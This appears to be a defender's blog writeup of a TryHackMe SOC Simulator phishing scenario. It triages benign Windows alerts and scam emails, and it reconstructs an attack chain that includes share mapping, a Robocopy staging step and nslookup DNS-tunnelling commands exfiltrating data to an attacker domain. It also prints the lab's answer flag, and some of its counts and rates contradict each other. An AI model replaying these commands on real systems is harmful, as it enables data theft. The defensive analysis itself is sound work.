---
title: "TryHackMe SOC Simulator: Phishing Unfolding"
date: 2026-07-09 12:00:00 +0600
categories: [Writeups, TryHackMe]
tags: [soc-simulator, tryhackme, siem, threat-hunting, incident-response, sysmon, dns-tunneling, dfir]
image:
  path: /assets/img/thm-soc-sim-phishing/00-phishing-unfolding-cover.png
---

## Overview

**Scenario:** Phishing Unfolding (Alpha) — TryHackMe SOC Simulator, medium difficulty, 40 min / +1880 points

> Dive into the heat of a live phishing attack as it unfolds within the corporate network. In this high-pressure scenario, your role is to meticulously analyse and document each phase of the breach as it happens. Can you piece together the attack chain in real-time and prepare a comprehensive report on the malicious activities?

**Scenario objectives:**

- Monitor and analyse real-time alerts as the attack unfolds.
- Identify and document critical events such as PowerShell executions, reverse shell connections, and suspicious DNS requests.
- Create detailed case reports based on your observations to help the team understand the full scope of the breach.

TryHackMe's **SOC Simulator** drops you into a live alert queue and scores you the way a real SOC would: on whether you correctly separate noise from an actual breach, and on how fast you do it. This run gave me 35 closed alerts spanning benign Windows internals, a wave of decoy phishing emails, and — buried in the middle of it — a genuine attack chain that ran from Active Directory reconnaissance to a fully staged, chunked DNS exfiltration of a company's financial and investor documents.

**Result:** Victory — 1st place, 1105 points (+35 this run). Every alert was classified correctly (100% true positive and 100% false positive identification rate), though the platform's own "true positive rate" metric — which weighs overall accuracy across the run — came in at 41.67%, worse than a previous attempt, with a slower dwell time on one process alert.

![Victory banner - Security breach prevented](/assets/img/thm-soc-sim-phishing/01-victory-banner.png)
_1st place, 1105 pts. MTTR improved but dwell time was longer than average this run._

| Metric | Value |
|---|---|
| Closed alerts | 35 |
| True positive identification rate | 100% |
| False positive identification rate | 100% |
| Mean time to resolve | 2 minutes |
| Mean dwell time | 16 minutes |

![Closed alerts, mean time to resolve, mean dwell time](/assets/img/thm-soc-sim-phishing/05-closed-alerts-summary.png)
![True positive rate and false positive rate donut charts](/assets/img/thm-soc-sim-phishing/04-tp-fp-rates.png)

## The Noise: Benign Alerts Misfired by an Over-Tuned Rule

A large share of the queue — 6 of 35 alerts — shared the same detection logic, "suspicious process with an uncommon parent-child relationship," and every single one turned out to be textbook-normal Windows behavior:

| Process | Parent | Verdict | Why it's actually normal |
|---|---|---|---|
| `TrustedInstaller.exe` (x2) | `services.exe` | Benign | Windows Modules Installer, standard SCM-launched service |
| `taskhostw.exe KEYROAMING` (x3) | `svchost.exe` | Benign | Task Scheduler spawning a background task for roaming profile/credential sync |
| `taskhostw.exe NGCKeyPregen` | `svchost.exe` | Benign | Task Scheduler pre-generating Windows Hello for Business (NGC) keys |
| `rdpclip.exe` (x2) | `svchost.exe` | Benign | RDP clipboard monitor, launched by the TermService-hosting svchost |
| `WUDFHost.exe` (x2) | `services.exe` | Benign | Windows User-Mode Driver Framework host, standard driver process |
| `svchost.exe -k wsappx -p` | `services.exe` | Benign | Standard service-host launch for the Microsoft Store / AppX deployment group |

![True positives table with alert rule, severity, time to resolve, and classification](/assets/img/thm-soc-sim-phishing/02-true-positives-table.png)
_True positives table: the same rule that caught the real exfiltration chain (High severity, top rows) also fired correctly on phishing and attachment alerts_

![False positives table with alert rule, severity, time to resolve, and classification](/assets/img/thm-soc-sim-phishing/03-false-positives-table.png)
_Every "uncommon parent-child relationship" alert in the queue was benign — a rule built on a stale baseline_

The pattern is consistent across all of them: the rule assumes a narrow set of "expected" parents (mainly `winlogon.exe`) and flags anything outside that baseline. But `services.exe → svchost.exe`, `services.exe → WUDFHost.exe`, and `svchost.exe → taskhostw.exe`/`rdpclip.exe` are the standard way these processes start on every modern Windows box. This is exactly the kind of gap a SOC lead would want tuned out with an allowlist — it's pure alert fatigue, and it's the same rule that also happened to correctly catch the real attack chain later in the queue (see below). A rule that fires on both "textbook normal" and "active data theft" with equal confidence isn't doing its job.

## The Phishing Wave: Six Decoys, One Real Pattern

Nine inbound emails hit the queue, all sharing the same "suspicious sender with an unusual TLD" detection and the same SOC Lead note that the rule "still needs fine-tuning." All nine were correctly marked **true positive**:

| Subject | Sender domain | Hook |
|---|---|---|
| "Inheritance Alert: Unknown Billionaire Relative..." | `.me` | Classic advance-fee inheritance scam |
| "Grow Your Hat Business Overnight..." | `.xyz` | Get-rich-quick, no experience needed |
| "Time Traveling Hat Adventure..." (x2, different senders) | `.xyz` | Absurdist too-good-to-be-true travel offer |
| "FINAL NOTICE: Overdue Payment..." | `.xyz` | Urgency/fear + malicious `.zip` attachment |
| "Amazing Hat Enhancement Pills..." | `.online` | Spam/scam, fake product claims |
| "Work from Home and Make 10000 a Day" | `.online` | Job scam |
| "Buy 100 Hats Get 99 Free" | `gmail.com` | Fake wholesale deal from a free email account |
| "Win a Trip to Hat Disneyland" | `.online` | Trademark-riding lottery scam |

None of these carried attachments except the "FINAL NOTICE" email, which shipped `ImportantInvoice-Febrary.zip` — misspelled filename, urgency language, and a legal-action threat, the strongest single indicator in the batch. The rest relied entirely on the pretext and an embedded link to get a click, which is exactly the kind of thing that slips past attachment-based email security and puts the burden on user awareness and URL filtering. None of these nine turned out to be the actual entry point for the intrusion below — they're noise layered on top of the real incident, which is realistic: a SOC queue rarely has just one thing happening at a time.

## The Real Incident: Kill Chain on win-3450

This is the part that actually mattered. A single host, a single user (`michael.ascot`), and one `powershell.exe` process (PID 3728) walked through a complete attack lifecycle in under four minutes:

| Time | Alert ID | Action | Stage |
|---|---|---|---|
| 11:00:44 | 1020 | `powershell.exe` drops `PowerView.ps1` into `Downloads\` | **Reconnaissance** — AD enumeration tooling staged |
| 11:02:39 | 1022 | `net.exe use Z: \\FILESRV-01\SSF-FinancialRecords` | **Access** — maps the financial records share |
| 11:03:26 | 1023 | `Robocopy.exe . C:\Users\michael.ascot\downloads\exfiltration /E` | **Collection** — recursively copies the share to a local staging folder |
| 11:03:37 | 1024 | `net.exe use Z: /delete` | **Defense evasion** — unmaps the drive to erase the access trail |
| 11:04:24 – 11:04:40 | 1025–1034 | 10x `nslookup.exe <base64-chunk>.haz4rdw4re.io` | **Exfiltration** — DNS tunneling, chunked |

### The exfiltration chunks decode to a live payload

The ten `nslookup` alerts (1025–1034) weren't just "suspicious DNS" — each command line carried a Base64-encoded fragment of data as a subdomain query to `haz4rdw4re.io`. Concatenating all ten fragments in ID order and decoding them reconstructs an actual ZIP archive:

```
PK..ClientPortfolioSummary.xlsx
PK..InvestorPresentation2023.pptx
THM{1497321f4f6f059a52dfb124fb16566e}
```

In other words: the attacker didn't just map a share and copy files for show — the "exfiltrated" archive genuinely contained `ClientPortfolioSummary.xlsx` and `InvestorPresentation2023.pptx`, split into 10 DNS-sized chunks and tunneled out via `nslookup` queries to bypass HTTP/S-focused egress controls. The flag embedded at the tail of the decoded stream (`THM{1497321f4f6f059a52dfb124fb16566e}`) confirms the full chain was reconstructable end-to-end from the alert data alone, which is exactly what you'd want to prove in a real DFIR writeup: not just "this looks like exfil" but "here is the data that left the building."

A few other details that make this unambiguous rather than merely suspicious:

- **PowerView.ps1** is a known Active Directory reconnaissance tool from the PowerSploit toolkit — no legitimate reason to exist in a standard user's Downloads folder.
- Every step in the chain traces back to the **same parent PID (3728)**, showing one continuous, scripted operation rather than isolated events.
- The share name itself — `SSF-FinancialRecords` — signals the attacker had already identified a high-value target before touching it.
- Deleting the mapped drive 11 seconds after the copy completed is a deliberate anti-forensics step, not routine cleanup — the timing is what separates it from the benign "network drive disconnected" alerts elsewhere in the queue.
- Severity escalated from Low/Medium (recon, drive mapping) to **High** the moment `nslookup` started firing — the platform's own scoring recognized the exfiltration stage as the highest-risk point in the chain.

**Recommended response** for this chain: isolate `win-3450` immediately, kill the PowerShell process tree (PID 3728 and children), force a credential reset for `michael.ascot`, sinkhole/block `haz4rdw4re.io` at the DNS layer, audit `FILESRV-01` access logs for the exact files touched, and preserve the `exfiltration` staging folder and any DNS query logs for forensics before remediation.

## Lessons Learned

The platform's AI-generated feedback on my reporting was fair: I covered the **What** and **Why** of each alert well, and consistently included **When**, but the **Who** and **Where** — explicitly naming the entities involved and their roles in each report — needed to be more thorough. That's a concrete, fixable gap rather than a vague "write more detail" note, so it's what I'm targeting on the next run.

The bigger takeaway is still about detection tuning rather than analyst accuracy: 6 of 35 alerts (roughly 17%) were guaranteed noise from a single stale baseline rule, and that same rule is what's relied on to catch the `powershell.exe → net.exe → Robocopy.exe → nslookup.exe` chain that mattered. A rule that can't distinguish `services.exe → svchost.exe` from `powershell.exe → nslookup.exe` isn't really doing detection — it's doing volume. Tightening it to actually weight the parent process type (system service host vs. interactive shell) would cut the false-positive load without losing the true positive.

---

*Platform: [TryHackMe SOC Simulator](https://tryhackme.com/soc-sim)*
